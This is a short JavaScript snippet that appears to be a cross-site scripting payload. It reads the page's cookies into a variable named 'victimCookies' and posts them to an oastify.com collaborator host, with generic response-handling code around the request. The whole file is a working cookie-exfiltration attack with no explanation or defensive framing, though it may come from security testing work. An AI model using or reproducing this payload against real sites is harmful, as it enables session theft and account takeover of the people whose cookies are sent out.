var victimCookies=document.cookie
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://nh8ei9rwamqc8e6cy8ui8m184zaqyim7.oastify.com/", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

var requestBody = "cookies=" + victimCookies;
xhr.send(requestBody);
